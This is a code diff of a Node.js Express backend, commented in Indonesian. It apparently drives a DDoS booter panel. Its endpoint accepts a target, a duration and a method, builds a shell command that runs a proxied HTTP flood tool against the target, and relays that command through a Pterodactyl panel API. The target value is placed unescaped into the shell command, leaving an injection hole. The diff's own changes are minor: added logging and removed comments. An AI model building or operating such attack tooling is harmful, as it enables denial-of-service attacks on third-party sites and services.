@@ -10,14 +10,16 @@ const PANEL_URL = 'https://xvoidmark.modzz.site';
 const SERVER_ID = '782feeb1';
 
 app.post('/run_command', async (req, res) => {
+  // Menampilkan data yang diterima
+  console.log('Data yang diterima:', req.body);
+
   const { target, duration, method } = req.body;
 
-  // Contoh validasi sederhana
+  // Validasi
   if (!target || !duration || !method) {
     return res.status(400).json({error: 'Semua field harus diisi'});
   }
 
-  // Contoh buat perintah shell custom berdasarkan method:
   let command = '';
   if (method === 'http') {
     command = `node /system/HTTPCOSTUM GET ${target} ${duration} 16 90 proxy.txt`;
@@ -27,7 +29,6 @@ app.post('/run_command', async (req, res) => {
     return res.status(400).json({error: 'Metode tidak dikenali'});
   }
 
-  // Kirim perintah ke Pterodactyl API (contoh restart server)
   try {
     const response = await fetch(`${PANEL_URL}/api/client/servers/${SERVER_ID}/command`, {
       method: 'POST',
@@ -47,11 +48,7 @@ app.post('/run_command', async (req, res) => {
 
     res.json({message: 'Perintah dikirim ke server', data});
   } catch (err) {
+    console.error('Error:', err);  // Menampilkan error di console
     res.status(500).json({error: err.message});
   }
-});
-
-const PORT = 3000;
-app.listen(PORT, () => {
-  console.log(`Server backend berjalan di http://localhost:${PORT}`);
 });
